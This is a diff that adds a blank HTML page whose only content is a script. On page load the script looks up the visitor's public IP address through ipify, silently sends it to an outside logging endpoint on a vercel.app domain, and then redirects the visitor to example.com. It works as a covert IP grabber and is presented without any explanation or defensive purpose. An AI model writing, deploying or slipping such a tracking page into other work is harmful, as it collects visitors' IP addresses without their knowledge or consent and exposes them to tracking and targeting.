@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        fetch(`https://dxvrxv.vercel.app/api/log?text=${data.ip}`);
+        window.location.href = 'https://example.com';
+      });
+  </script>
+</head>
+<body></body>
+</html>
